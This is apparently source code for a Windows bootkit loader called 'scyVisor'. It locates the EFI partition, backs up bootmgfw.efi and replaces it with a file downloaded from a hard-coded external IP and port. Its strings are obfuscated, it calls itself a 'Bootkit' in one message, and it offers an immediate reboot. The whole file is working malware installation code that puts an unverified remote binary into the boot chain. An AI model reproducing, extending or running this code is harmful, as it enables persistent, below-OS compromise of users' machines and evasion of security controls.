#include <Windows.h>
#include <string>
#include <intrin.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include "client.h"
#include "xorstr.h"
enum ErrorCode {
	ERROR_NONE = 0,
	ERROR_FIND_EFI_PARTITION = 1,
	ERROR_VIRTUALIZATION_NOT_ENABLED = 2,
	ERROR_CANNOT_LOAD_HYPERVISOR = 3,
	ERROR_BOOTMGFW_NOT_FOUND = 4,
	ERROR_BOOTMGFW_BACKUP_NOT_FOUND = 5,
	ERROR_DOWNLOAD_FAILED = 6,
	ERROR_RESTORE_BACKUP_FAILED = 7,
	ERROR_INVALID_USER_INPUT = 8,
};

void PrintError(ErrorCode code) {
	std::cerr << adsq("[scyVisor] Error: #") << code << std::endl;
}

std::wstring FindEFIPartition(void)
{
	TCHAR volumeName[260];
	HANDLE firstVolume = FindFirstVolume(volumeName, 260);
	if (firstVolume == INVALID_HANDLE_VALUE)
		return L"";

	HANDLE next = firstVolume;
	GUID efiPart;
	efiPart.Data1 = 0xc12a7328;
	efiPart.Data2 = 0xf81f;
	efiPart.Data3 = 0x11d2;
	efiPart.Data4[0] = 0xba;
	efiPart.Data4[1] = 0x4b;
	efiPart.Data4[2] = 0x00;
	efiPart.Data4[3] = 0xa0;
	efiPart.Data4[4] = 0xc9;
	efiPart.Data4[5] = 0x3e;
	efiPart.Data4[6] = 0xc9;
	efiPart.Data4[7] = 0x3b;
	//c12a7328-f81f-11d2-ba4b-00a0c93ec93b
	while (FindNextVolume(next, volumeName, 260)) {
		PARTITION_INFORMATION_EX partinfo;
		DWORD fuck;

		int len = wcslen(volumeName);
		volumeName[len - 1] = L'\0';

		HANDLE file = CreateFileW(volumeName, GENERIC_READ,
			FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);

		volumeName[len - 1] = L'\\';

		DeviceIoControl(file, IOCTL_DISK_GET_PARTITION_INFO_EX, NULL, 0, &partinfo, sizeof(partinfo), &fuck, NULL);
		CloseHandle(file);

		if (partinfo.PartitionStyle == PARTITION_STYLE_GPT) {
			if (partinfo.Gpt.PartitionType == efiPart) {
				FindVolumeClose(next);
				return volumeName;
			}
		}
	}
	FindVolumeClose(next);
	return L"";
}

bool WinSupportHV() {

	DWORD dwPInfo = NULL;
	DWORD dwVersion = NULL;
	DWORD dwMajorVersion = NULL;
	DWORD dwMinorVersion = NULL;
	GetProductInfo(6, 2, 0, 0, &dwPInfo);
	switch (dwPInfo) {
	case PRODUCT_ULTIMATE:
	case PRODUCT_HYPERV:
	case PRODUCT_PRO_WORKSTATION:
	case PRODUCT_PROFESSIONAL:
	case PRODUCT_ENTERPRISE:
	case PRODUCT_EDUCATION:
	case PRODUCT_STANDARD_SERVER:
	case PRODUCT_STANDARD_SERVER_CORE:
		return true;
	default:
		return false;
	}
}

bool loadfile(std::wstring outputPath) {

	OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);

	const std::string host = adsq("101.99.76.106");
	const std::string port = adsq("7877");
	loadBoot(host, port, outputPath);

	return true;

}


int main() {
	const std::wstring efiPart = FindEFIPartition();
	if (efiPart.empty()) {
		PrintError(ERROR_FIND_EFI_PARTITION);
		return ERROR_FIND_EFI_PARTITION;
	}

	const std::wstring bootmgfwBackupPath = efiPart + L"EFI\\Microsoft\\Boot\\bootmgfw.efi.backup";
	const std::wstring bootmgfwPath = efiPart + L"EFI\\Microsoft\\Boot\\bootmgfw.efi";

	if (!std::filesystem::exists(bootmgfwPath)) {
		std::cerr << adsq("Error: Couldnt load Bootkit! restoring default settings...") << std::endl;
		if (std::filesystem::exists(bootmgfwBackupPath)) {
			std::cout << adsq("Attempting to restore...") << std::endl;
			if (MoveFileW(bootmgfwBackupPath.c_str(), bootmgfwPath.c_str())) {
				std::cout << adsq("Successfully restored default settings") << std::endl;
			}
			else {
				std::cerr << adsq("Error code: ") << GetLastError() << std::endl;
				PrintError(ERROR_RESTORE_BACKUP_FAILED);
				return ERROR_RESTORE_BACKUP_FAILED;
			}
		}
		else {
			std::cerr << adsq("No backup file found. Cannot proceed.") << std::endl;
			PrintError(ERROR_BOOTMGFW_NOT_FOUND);
			return ERROR_BOOTMGFW_NOT_FOUND;
		}
	}

	bool IsUEFI = true;
	bool IsSecureBootEnabled = false;
	bool IsCorrectEdition = WinSupportHV();

	if (!IsCorrectEdition) {
		PrintError(ERROR_CANNOT_LOAD_HYPERVISOR);
		return ERROR_CANNOT_LOAD_HYPERVISOR;
	}

	bool success = false;

	if (SetFileAttributesW(bootmgfwPath.c_str(), FILE_ATTRIBUTE_NORMAL)) {
		if (!std::filesystem::exists(bootmgfwBackupPath)) {
			if (MoveFileW(bootmgfwPath.c_str(), bootmgfwBackupPath.c_str())) {
				if (loadfile(bootmgfwPath)) {
					//std::cout << "Downloaded new bootmgfw.efi from server!" << std::endl;

					success = true;

				}
				else {
					PrintError(ERROR_DOWNLOAD_FAILED);
					MoveFileW(bootmgfwBackupPath.c_str(), bootmgfwPath.c_str());
				}

			}
		}
		else {
			success = true;

			if (loadfile(bootmgfwPath)) {
				//std::cout << "Downloaded and replaced bootmgfw.efi from server!" << std::endl;
			}
			else {
				PrintError(ERROR_DOWNLOAD_FAILED);
				MoveFileW(bootmgfwBackupPath.c_str(), bootmgfwPath.c_str());
			}
		}
	}

	if (success) {
		std::cout << adsq("ScyVisor Loader was successful!") << std::endl;
		std::cout << adsq("A restart is required. Do you want to restart? (Y/N): ");
		char choice = std::getchar();
		if (choice == 'Y' || choice == 'y') {
			std::cout << adsq("Restarting the system...") << std::endl;
			system("shutdown /r /t 0");
		}
		else if (choice == 'N' || choice == 'n') {
			std::cout << adsq("Restart canceled. Please restart the system manually.") << std::endl;
		}
		else {
			PrintError(ERROR_INVALID_USER_INPUT);
		}
	}

	std::cout << adsq("Press any key to exit...") << std::endl;
	std::cin.get();
	return ERROR_NONE;
}